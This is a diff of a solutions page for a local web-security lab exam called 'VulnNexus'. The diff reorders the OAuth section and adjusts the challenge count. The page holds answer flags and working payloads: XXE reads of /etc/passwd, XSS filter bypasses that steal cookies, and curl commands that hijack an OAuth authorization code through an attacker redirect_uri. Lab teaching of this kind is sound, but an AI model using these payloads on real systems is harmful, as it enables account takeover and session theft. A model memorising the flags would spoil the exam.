@@ -4,7 +4,7 @@ tags: [css-exam, labs, solution, web]
 # VulnNexus (app 2 — medium→hard) — Solutions
 > ↑ Lab Kit · method: Web Penetration Test Checklist
 
-`B=http://localhost:8001`. Six flags. Try each yourself first. (Track them on the 📊 Progress page.)
+`B=http://localhost:8001`. Seven challenges (six distinct flags — XXE reuses the path-traversal flag). Try each yourself first. (Track them on the 📊 Progress page.)
 
 ## 🏁 Flags — one per vuln
 | Vuln | Flag | How |
@@ -16,18 +16,6 @@ tags: [css-exam, labs, solution, web]
 | XXE | `FLAG{tr4versed_out_of_the_docs_directory}` | external entity → `file:///…/webapp2/private2/secret_config.txt` (or read `/etc/passwd` to prove it) |
 | Filtered XSS | `FLAG{xss_filter_byp4ss_c00kie}` | bypass the filter (`<img onerror>`) → steal the non-HttpOnly `flag` cookie via `document.cookie` |
 | OAuth (redirect_uri) | `FLAG{oauth_redirect_uri_not_validated}` | `oauth_authorize.php?redirect_uri=<attacker>` → steal code → `oauth_callback.php?code=` |
-
-## 7. OAuth — unvalidated `redirect_uri` (auth-code theft)
-**Answer:** the authorization endpoint sends the victim's auth code to **any** `redirect_uri` (no allow-list), so an attacker steals the code and logs in as the victim (`admin`).
-**Command:**
-```
-# 1) the lure link makes the admin's code redirect to the ATTACKER's URL (your listener):
-curl -s -D - "$B/oauth_authorize.php?redirect_uri=http://127.0.0.1:9002/&state=x" -o /dev/null | grep -i location
-#    -> Location: http://127.0.0.1:9002/?code=<CODE>&state=x   (the code leaked to the attacker)
-# 2) replay the stolen code at the callback:
-curl -s "$B/oauth_callback.php?code=<CODE>"
-```
-**Result:** `FLAG{oauth_redirect_uri_not_validated}` — authenticated as admin. **Reason:** a real OAuth server must validate `redirect_uri` against the value registered for the `client_id`; here it's attacker-controlled → authorization-code theft → account takeover. Deck: Broken Authentication / JWT Attacks.
 
 ## 1. UNION SQL injection  (`search.php?q=`)
 **Answer:** `q` concatenated into a 3-column query → UNION-dump the `secrets` table.
@@ -161,6 +149,18 @@ $B/greet.php?name=<img src=x onerror=alert(document.domain)>        # no <script
 $B/greet.php?name=<scr<script>ipt>alert(1)</scr</script>ipt>        # nested: inner <script> removed -> <script> remains
 ```
 **Result:** the payload executes. **Reason:** blacklist filtering (`str_ireplace('<script>','')`) instead of output-encoding. Deck: XSS_02_Payloads · XSS_06_CSP_Bypass.
+
+## 7. OAuth — unvalidated `redirect_uri` (auth-code theft)
+**Answer:** the authorization endpoint sends the victim's auth code to **any** `redirect_uri` (no allow-list), so an attacker steals the code and logs in as the victim (`admin`).
+**Command:**
+```
+# 1) the lure link makes the admin's code redirect to the ATTACKER's URL (your listener):
+curl -s -D - "$B/oauth_authorize.php?redirect_uri=http://127.0.0.1:9002/&state=x" -o /dev/null | grep -i location
+#    -> Location: http://127.0.0.1:9002/?code=<CODE>&state=x   (the code leaked to the attacker)
+# 2) replay the stolen code at the callback:
+curl -s "$B/oauth_callback.php?code=<CODE>"
+```
+**Result:** `FLAG{oauth_redirect_uri_not_validated}` — authenticated as admin. **Reason:** a real OAuth server must validate `redirect_uri` against the value registered for the `client_id`; here it's attacker-controlled → authorization-code theft → account takeover. Deck: Broken Authentication / JWT Attacks.
 
 ---
 # 🧠 Why each bypass works — mechanism & examples
